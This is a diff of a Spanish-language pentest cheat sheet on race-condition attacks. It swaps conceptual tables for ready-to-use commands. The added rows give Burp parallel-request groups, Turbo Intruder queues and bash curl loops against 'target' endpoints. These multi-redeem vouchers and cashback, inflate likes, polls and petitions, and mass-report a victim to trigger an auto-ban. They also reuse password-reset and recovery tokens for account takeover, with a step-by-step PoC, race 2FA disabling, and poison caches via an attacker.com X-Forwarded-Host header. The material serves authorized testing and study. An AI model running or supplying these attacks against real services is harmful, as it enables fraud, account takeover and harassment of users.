@@ -25,17 +25,14 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Race entre endpoints distintos que comparten estado. Endpoint A modifica → Endpoint B verifica | Cross-endpoint TOCTOU. |
-| Order race | `POST /cart/checkout` + `DELETE /cart/item/X` simultáneos | Item shipped sin cobrar. |
-| Permission race | `POST /admin/grant` + `DELETE /admin/role` para mismo user | Permission state confusion. |
-| File race | `POST /upload` + `GET /file/list` antes de scan complete | Pre-scan access. |
-| Auth race | `POST /login` + `POST /logout` simultáneos | Session limbo. |
-| Subscription race | `POST /upgrade` + `POST /cancel` | Tier confusion. |
-| Cross-tenant race | Tenant A action + Tenant B context switch | Multi-tenant leak. |
-| Refund + chargeback | `POST /refund` + payment processor `chargeback` | Double-refund. |
-| Friend request + block | `POST /friend/accept` + `POST /user/block` | State conflict. |
-| Vote + delete content | `POST /vote/up` + `DELETE /post` | Orphan vote. |
-| Generic A→B chain | `setStateA + readStateA` simultáneos en distinct endpoints | Universal pattern. |
+| Burp parallel: `POST /cart/checkout` + `DELETE /cart/item/X` | Item shipped sin cobrar | Cross-endpoint TOCTOU. |
+| Burp parallel: `POST /admin/grant?user=me&role=admin` + `DELETE /admin/role?user=me` | Permission state confusion | Admin endpoint race. |
+| Burp parallel: `POST /upload` + `GET /file/list?filter=*.php` | Pre-scan listing post-upload | Upload + list race. |
+| Burp parallel: `POST /login` + `POST /logout` con same session | Session limbo state | Auth race. |
+| Burp parallel: `POST /subscription/upgrade` + `POST /subscription/cancel` | Tier confusion | Subscription state race. |
+| Burp parallel: `POST /refund?order=X` + chargeback simulation via test mode | Double-refund | Payment processor race. |
+| Burp parallel: `POST /vote/up?post=X` + `DELETE /post/X` | Orphan vote en deleted post | Cross-content race. |
+| Generic A→B chain en Turbo Intruder: `engine.queue(setStateA); engine.queue(readStateA)` × N | Universal pattern | Cross-endpoint state share. |
 ^race-vector-multi-endpoint
 
 ___
@@ -44,16 +41,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Voucher diseñado para 1-time-use o stock limitado. Race redime N veces simultáneamente | Stock overrun. |
-| Single-use voucher | Code "PROMO50" → 1 use total → race 100 veces | All applied. |
-| Limited stock | Coupon stock=10 → 100 redemptions → > 10 cobradas | Inventory bypass. |
-| Per-user limit | "1 use per user" → spam concurrent same user | Single-user overrun. |
-| Discount stack | Apply discount per item → race agrega múltiples al mismo item | Stack ineligible. |
-| Birthday gift | Annual gift → race en mismo día → multiple gifts | Yearly bypass. |
-| Refund credit | Credit one-time → race | Multi-credit. |
-| Affiliate referral | Referral one-per-signup → race signup + referral redeem | Multi-credit. |
-| Cashback claim | Cashback per transaction → race triggers multiple | Ledger inflation. |
-| Loyalty points | Points earn per action → race earn multiple | Point overrun. |
+| Burp Repeater group `POST /api/promo {"code":"PROMO50"}` × 100, "Send group in parallel" | Multi-redeem single-use voucher | Voucher 1-time-use. |
+| Turbo Intruder con 100 concurrent redemption requests al mismo code | Stock overrun | Stock limitado. |
+| `for i in {1..50}; do curl -X POST -b "$C" -d '{"code":"BIRTHDAY2025"}' https://target/api/gift/redeem & done; wait` | Multi-redeem birthday gift annual | Per-year limit race. |
+| Burp parallel: `POST /api/discount {"code":"X","item":1}` × 10 | Stack discount múltiples veces sobre same item | Discount stack race. |
+| Burp parallel: `POST /api/cashback {"transaction":"abc"}` × 100 | Multi-credit cashback claim | One-per-tx limit race. |
+| `for i in {1..50}; do curl -X POST -b "$C" -d '{"action":"earn"}' https://target/api/loyalty/points & done; wait` | Loyalty point overrun | Point earn race. |
 ^race-vector-voucher
 
 ___
@@ -62,16 +55,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | App enforces "1 vote per user per item". Race spam votes → multiple counted | Direct manipulation. |
-| Like spam | `POST /like/123` × 100 simultáneos → like counter += 100 | Visible amplification. |
-| Star rating | Rating 1-5, "1 per user" → multiple ratings count → average sesgo | Rating fraud. |
-| Vote/reaction | Reddit-style upvote-only logic → spam concurrent | Visibility manipulation. |
-| Poll manipulation | One vote per user → multi-vote campaign | Result distortion. |
-| Comment likes | Like de same user × 100 | Amplificación. |
-| Report abuse | Multi-report mismo content → trigger auto-ban | DoS al user. |
-| Survey response | Single submit → multi-submit → skew data | Research integrity. |
-| Subscriber count | Subscribe action → race → multiple subscribed → uninflated count fix later | Vanity metric. |
-| Petition signature | Single signature → spam signatures from same identity | Petition fraud. |
+| `for i in {1..100}; do curl -X POST -b "$C" https://target/api/like/post/123 & done; wait` | Multi-like single user → counter += 100 | Like counter race. |
+| Burp parallel: `POST /api/rate {"item":123,"rating":5}` × 100 same user | Rating fraud — average skewed | Star rating race. |
+| Turbo Intruder con 200 concurrent `POST /poll/vote {"option":"X"}` same user | Poll manipulation | One-vote-per-user race. |
+| `for i in {1..50}; do curl -X POST -b "$C" -d '{"reason":"abuse","target":"victim"}' https://target/api/report & done; wait` | Multi-report → auto-ban victim | Report abuse race. |
+| Burp parallel: `POST /api/petition/sign {"petition":1}` × 100 same user | Petition signature fraud | Single-signature race. |
+| Burp parallel: `POST /api/follow {"user":"X"}` × 100 | Follower count manipulation | Follow race. |
 ^race-vector-voting
 
 ___
@@ -80,30 +69,33 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Reset token consume race. Atacante request reset → victim también request → atacante usa token de victim | Multi-actor race. |
-| Reset token reuse | Token marked-used after click. Race click + actual reset | Token lifetime extension. |
-| Reset token TTL race | Token expires → race window | Edge timing. |
-| Email change race | New email pending verification → race clicks confirm | Email hijack. |
-| Account merge race | Confirm both sides → race triggered before victim confirm | Hostile merge. |
-| 2FA enrollment race | Setup MFA + bypass MFA simultáneos | 2FA fake state. |
-| Password change race | Old + new password set → race set without old | Direct change. |
-| Recovery code use race | One-time recovery code → race | Reuse. |
-| Session token issue race | Login + token issue → race issue twice | Multiple tokens. |
-| OAuth state race | OAuth callback state validate → race state reuse | Auth flow. |
+| Burp parallel: `POST /password/reset {"token":"$T","new_password":"x"}` × 100 con stolen T | Reset token reuse | Token mark-used race. |
+| Burp parallel: `POST /password/reset {"token":"$T","new_password":"X"}` × 5 con tokens distintos | Multiple resets same account | Multi-token race. |
+| Burp parallel: `POST /email/confirm {"token":"$T"}` × 100 | Email change confirm reuse | Confirm race. |
+| Burp parallel: `POST /account/merge?with=$VICTIM` + race con confirm endpoint | Hostile merge bypass victim confirm | Account merge race. |
+| Burp parallel: `POST /2fa/disable` + `POST /2fa/disable/confirm` × 50 | 2FA disable race | MFA weakening. |
+| Burp parallel: `POST /password/change {"old":"X","new":"Y"}` × 100 con wrong old | Race set new sin verify old | Password change race. |
+| Burp parallel: `POST /recovery/use {"code":"$CODE"}` × 50 | Recovery code reuse | Single-use recovery race. |
 ^race-vector-ato
 
 ### PoC ATO via reset race
 
 ```
 1. Atacante request password reset for victim@target.com
-   → Token T1 enviado por email a victim.
-2. Victim también request reset (concurrent or after).
-   → Token T2 enviado.
-3. Atacante intercepta T1 vía MITM o XSS u OOB leak.
-4. Atacante usa T1 + sends 100 concurrent reset-completion requests.
-5. Race: server marks T1 used, but doesn't fully execute before
-   atacante's parallel request reads T1 still valid.
-6. Atacante completes reset → password set.
+   → Token T enviado al email víctima
+
+2. Atacante intercepta T (MITM / SDT / OAuth chain / OOB)
+
+3. Burp Repeater group con N requests:
+   POST /password/reset
+   {"token":"T","new_password":"attacker_pass"}
+
+4. "Send group in parallel (single connection)"
+
+5. Race: server marks T used, pero múltiples reset-completion
+   requests leen T como aún valid → multiple resets succeed
+
+6. Atacante login con attacker_pass → ATO
 ```
 
 ___
@@ -112,16 +104,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concepto | Cache miss → backend genera response → cache stores. Race entre miss y store window | Cache poisoning timing. |
-| Single-flight bypass | Cache uses lock to prevent thundering herd. Race lock acquire | Bypass single-flight. |
-| Cache stampede | Cache TTL expires → multiple misses simultaneously | Backend overload. |
-| Race poison | Mientras cache fill in progress, atacante manda poisoned request | Wins race → poisoned cached. |
-| Validate-while-revalidate race | Conditional GET race | Stale serve race. |
-| Multi-tier cache | L1 cache miss → L2 lookup → L2 miss → backend. Race entre tiers | Complex multi-stage. |
-| CDN edge race | Geographic edges race propagation | Per-region poisoning. |
-| Cache invalidation race | Invalidate + read | Read stale post-invalidation. |
-| Combine con HRS | HTTP Request Smuggling + cache fill race | Multi-vector. |
-| Cache deception race | Fill cache with private data via race window | TOCTOU cache. |
+| Burp parallel: `GET /api/x?cb=$(date +%s)` × 100 con same cache-busting key | Cache stampede / single-flight bypass | Cache miss. |
+| Turbo Intruder: `engine.queue(legitGET); engine.queue(poisonedGET)` × N en parallel | Race poison durante cache fill | Cache fill race. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/?cb=$(date +%s)` × 50 parallel | Race poisoned variant | Cache fill + HHI combo. |
+| Trigger cache TTL expire + flood concurrent: `for i in {1..100}; do curl -H "Cache-Control: no-cache" https://target/x & done; wait` | Stampede backend overload | TTL window race. |
+| Burp parallel: `PURGE /api/x` + `GET /api/x` (read inmediato post-purge) | Read stale post-invalidation | Cache invalidation race. |
 ^race-vector-cache
 
 ***
